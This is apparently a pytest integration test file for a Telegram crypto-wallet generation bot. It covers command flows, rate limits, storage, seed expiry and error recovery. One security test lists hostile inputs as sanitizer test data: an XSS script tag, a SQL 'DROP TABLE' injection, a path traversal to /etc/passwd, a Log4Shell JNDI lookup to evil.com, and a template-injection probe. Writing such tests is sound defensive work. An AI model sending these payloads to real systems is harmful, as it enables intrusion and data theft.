"""
Integration tests for the complete wallet bot system.
"""
import pytest
import asyncio
from unittest.mock import AsyncMock, Mock, patch
from aiogram.types import Message, CallbackQuery, User

from src.validators import ValidationError
from src.error_handling import ErrorHandler

class TestEndToEndWalletGeneration:
    """Test complete wallet generation workflows."""
    
    @pytest.mark.asyncio
    async def test_command_to_wallet_generation(self):
        """Test complete flow from /generate command to wallet creation."""
        from src.bot import cmd_generate, _do_generate
        
        # Mock message
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_user.first_name = "TestUser"
        mock_message.from_user = mock_user
        mock_message.text = "/generate ETH"
        
        # Mock dependencies
        with patch('src.bot._rate_limited', return_value=False):
            with patch('src.bot.generate_wallet') as mock_gen:
                with patch('src.bot.address_qr_png') as mock_qr:
                    with patch('src.bot.ProfileStore.add'):
                        with patch('src.bot.SeedStore.put'):
                            # Mock wallet info
                            from src.wallets import WalletInfo
                            mock_gen.return_value = WalletInfo(
                                chain="ETH",
                                derivation_path="m/44'/60'/0'/0/0",
                                address="0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D",
                                mnemonic="test mnemonic words here for testing purposes only never use this"
                            )
                            
                            # Mock QR generation
                            from io import BytesIO
                            mock_qr_data = BytesIO(b"fake png data")
                            mock_qr.return_value = mock_qr_data
                            
                            # Execute command
                            await cmd_generate(mock_message)
        
        # Verify wallet generation was called
        mock_gen.assert_called_once_with(chain="ETH")
        
        # Verify QR generation
        mock_qr.assert_called_once()
        
        # Verify responses were sent
        assert mock_message.answer.call_count >= 2  # Text + success message
        assert mock_message.answer_photo.called
    
    @pytest.mark.asyncio
    async def test_ui_button_to_wallet_generation(self):
        """Test complete flow from UI button to wallet creation."""
        from src.bot import on_quick_generate_button, on_generate_callback
        
        # Step 1: User clicks Quick Generate button
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_message.from_user = mock_user
        
        with patch('src.bot._rate_limited', return_value=False):
            await on_quick_generate_button(mock_message)
        
        # Should send chain selection
        mock_message.answer.assert_called_once()
        call_args = mock_message.answer.call_args
        assert "Quick Generate" in call_args[0][0]
        assert 'reply_markup' in call_args[1]
        
        # Step 2: User selects chain via callback
        mock_callback = AsyncMock(spec=CallbackQuery)
        mock_callback.data = "gen:ETH"
        mock_callback.message = mock_message
        mock_callback.from_user = mock_user
        
        with patch('src.bot._do_generate', new_callable=AsyncMock) as mock_do_gen:
            with patch('src.bot.safe_answer_callback', new_callable=AsyncMock):
                await on_generate_callback(mock_callback)
        
        # Should call wallet generation
        mock_do_gen.assert_called_once_with(mock_message, "ETH")


class TestErrorHandlingIntegration:
    """Test error handling across the system."""
    
    @pytest.mark.asyncio
    async def test_validation_error_handling(self):
        """Test that validation errors are handled properly."""
        from src.bot import cmd_generate
        
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_message.from_user = mock_user
        mock_message.text = "/generate INVALID_CHAIN"
        
        with patch('src.bot._rate_limited', return_value=False):
            await cmd_generate(mock_message)
        
        # Should send validation error message
        mock_message.answer.assert_called_once()
        call_args = mock_message.answer.call_args
        error_message = call_args[0][0]
        assert "❌" in error_message
        assert "Unsupported chain" in error_message
    
    @pytest.mark.asyncio
    async def test_network_error_recovery(self):
        """Test network error recovery in wallet operations."""
        from src.bot import _evm_balances
        import aiohttp
        
        # Mock addresses
        addresses = ["0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D"]
        
        # Test network error recovery
        with patch('src.bot._get_evm_rpc', return_value="http://test-rpc"):
            with patch('aiohttp.ClientSession') as mock_session:
                # First call fails, second succeeds
                mock_response = AsyncMock()
                mock_response.status = 200
                mock_response.json.return_value = [{"id": 0, "result": "0x0"}]
                
                mock_session_instance = AsyncMock()
                mock_session_instance.post.return_value.__aenter__.return_value = mock_response
                mock_session.return_value.__aenter__.return_value = mock_session_instance
                
                # Should succeed
                result = await _evm_balances("ETH", addresses)
                assert len(result) == 1
                assert result[0][0] == addresses[0]
    
    @pytest.mark.asyncio
    async def test_rate_limit_handling(self):
        """Test rate limit handling in commands."""
        from src.bot import cmd_generate
        
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_message.from_user = mock_user
        mock_message.text = "/generate ETH"
        
        with patch('src.bot._rate_limited', return_value=True):
            await cmd_generate(mock_message)
        
        # Should send rate limit message
        mock_message.answer.assert_called_once()
        call_args = mock_message.answer.call_args
        assert "Rate limit exceeded" in call_args[0][0] or "⏰" in call_args[0][0]


class TestDataPersistence:
    """Test data persistence and profile management."""
    
    @pytest.mark.asyncio
    async def test_wallet_profile_storage(self):
        """Test that wallets are properly stored in profiles."""
        from src.bot import ProfileStore
        
        user_id = 12345
        chain = "ETH"
        address = "0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D"
        derivation_path = "m/44'/60'/0'/0/0"
        
        # Mock the database operations
        with patch.object(ProfileStore, '_conn') as mock_conn:
            mock_conn.execute = Mock()
            mock_conn.commit = Mock()
            
            # Test adding wallet
            ProfileStore.add(user_id, chain, address, derivation_path)
            
            # Should call database operations
            mock_conn.execute.assert_called()
            mock_conn.commit.assert_called()
    
    @pytest.mark.asyncio
    async def test_bulk_wallet_storage(self):
        """Test bulk wallet storage operations."""
        from src.bot import ProfileStore
        
        user_id = 12345
        wallets = [
            ("ETH", "0x123", "m/44'/60'/0'/0/0"),
            ("BTC", "bc1xyz", "m/84'/0'/0'/0/0"),
        ]
        
        with patch.object(ProfileStore, '_conn') as mock_conn:
            mock_conn.executemany = Mock()
            mock_conn.commit = Mock()
            
            # Test bulk add
            ProfileStore.add_many(user_id, wallets)
            
            # Should call bulk database operations
            mock_conn.executemany.assert_called()
            mock_conn.commit.assert_called()


class TestSecurityIntegration:
    """Test security measures across the system."""
    
    def test_input_sanitization_in_commands(self):
        """Test that malicious inputs are properly sanitized."""
        from src.validators import InputValidator
        
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
        ]
        
        for malicious in malicious_inputs:
            # Should not crash and should sanitize
            sanitized = InputValidator.sanitize_text(malicious)
            
            # Basic safety checks
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized or not any(c in sanitized for c in "<>;")
            assert "../" not in sanitized
    
    @pytest.mark.asyncio
    async def test_seed_storage_security(self):
        """Test that seeds are handled securely."""
        from src.bot import SeedStore
        import time
        
        user_id = 12345
        test_mnemonic = "test seed phrase for security testing only"
        
        # Store seed with short TTL
        SeedStore.put(user_id, test_mnemonic, ttl_seconds=1)
        
        # Should be available immediately
        retrieved = SeedStore.take(user_id)
        assert retrieved == test_mnemonic
        
        # Should not be available again (one-time use)
        retrieved_again = SeedStore.take(user_id)
        assert retrieved_again is None
        
        # Test TTL expiry
        SeedStore.put(user_id, test_mnemonic, ttl_seconds=1)
        await asyncio.sleep(2)  # Wait for expiry
        expired = SeedStore.take(user_id)
        assert expired is None
    
    def test_callback_data_validation(self):
        """Test that callback data is properly validated."""
        from src.validators import InputValidator
        
        # Valid callback data
        valid_callbacks = ["gen:ETH", "wallet:clear", "help:commands"]
        for valid in valid_callbacks:
            result = InputValidator.validate_callback_data(valid)
            assert result == valid
        
        # Invalid callback data
        invalid_callbacks = ["gen<script>", "wallet;drop", "help../etc"]
        for invalid in invalid_callbacks:
            with pytest.raises(ValidationError):
                InputValidator.validate_callback_data(invalid)


class TestPerformanceIntegration:
    """Test system performance under various conditions."""
    
    @pytest.mark.asyncio
    async def test_concurrent_wallet_generation(self):
        """Test concurrent wallet generation performance."""
        from src.wallets import generate_wallet
        
        async def generate_single():
            return generate_wallet("ETH")
        
        # Generate multiple wallets concurrently
        tasks = [generate_single() for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        # All should succeed
        assert len(results) == 10
        for result in results:
            assert result.chain == "ETH"
            assert len(result.mnemonic.split()) == 12
        
        # All should be unique
        addresses = [r.address for r in results]
        assert len(set(addresses)) == 10
    
    @pytest.mark.asyncio
    async def test_large_bulk_operation_handling(self):
        """Test handling of large bulk operations."""
        from src.bot import on_bulk_count_input, _pending_bulk
        
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_message.from_user = mock_user
        mock_message.text = "1000"  # Large but valid count
        
        # Set up bulk state
        _pending_bulk[12345] = {"stage": "count", "type": "csv"}
        
        await on_bulk_count_input(mock_message)
        
        # Should accept large valid counts
        mock_message.answer.assert_called_once()
        call_args = mock_message.answer.call_args
        assert "1,000" in call_args[0][0]  # Should format numbers nicely
        assert "reply_markup" in call_args[1]  # Should provide chain selection


class TestSystemResilience:
    """Test system resilience and recovery capabilities."""
    
    @pytest.mark.asyncio
    async def test_database_error_recovery(self):
        """Test recovery from database errors."""
        from src.bot import ProfileStore
        
        # Mock database error
        with patch.object(ProfileStore, '_conn') as mock_conn:
            mock_conn.execute.side_effect = Exception("Database error")
            
            # Should not crash on database errors
            try:
                ProfileStore.add(12345, "ETH", "0x123", "m/44'/60'/0'/0/0")
                # Should complete without raising exception
            except Exception:
                pytest.fail("Database errors should be handled gracefully")
    
    @pytest.mark.asyncio
    async def test_malformed_message_handling(self):
        """Test handling of malformed messages."""
        from src.bot import cmd_generate
        
        # Test with None text
        mock_message = AsyncMock(spec=Message)
        mock_user = Mock(spec=User)
        mock_user.id = 12345
        mock_message.from_user = mock_user
        mock_message.text = None
        
        with patch('src.bot._rate_limited', return_value=False):
            await cmd_generate(mock_message)
        
        # Should handle gracefully
        mock_message.answer.assert_called_once()
        call_args = mock_message.answer.call_args
        assert "No command text" in call_args[0][0] or "❌" in call_args[0][0]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])